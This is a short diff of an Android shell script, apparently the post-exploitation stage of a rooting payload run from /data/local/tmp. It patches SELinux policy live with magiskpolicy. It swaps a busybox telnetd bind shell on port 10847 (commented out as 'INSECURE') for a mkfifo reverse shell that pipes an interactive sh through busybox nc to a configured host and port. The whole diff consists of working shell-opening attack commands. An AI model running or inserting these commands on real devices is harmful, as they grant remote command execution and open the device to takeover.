@@ -5,6 +5,9 @@
 #id > /data/local/tmp/mylog1
 #cat /proc/self/status >> /data/local/tmp/mylog1
 
+HOST=127.0.0.1
+PORT=10847
+
 export ANDROID_DATA=/data
 export ANDROID_ART_ROOT=/apex/com.android.art
 export HOME=/
@@ -29,7 +32,17 @@ export ANDROID_I18N_ROOT=/apex/com.android.i18n
 
 #/data/local/tmp/magiskpolicy --save /data/local/tmp/policy-dump
 /data/local/tmp/magiskpolicy --magisk --live
-/data/local/tmp/busybox telnetd -l /bin/sh -p 10847 &
+
+# INSECURE
+# /data/local/tmp/busybox telnetd -l /bin/sh -p 10847 &
+
+# Reverse shell: A little safer
+sleep 2
+FIFO=/data/local/tmp/reverse-fifo
+
+rm -f $FIFO
+mkfifo $FIFO
+cat $FIFO | /system/bin/sh -i 2>&1|/data/local/tmp/busybox nc $HOST $PORT > $FIFO
 
 # Work in progress
 
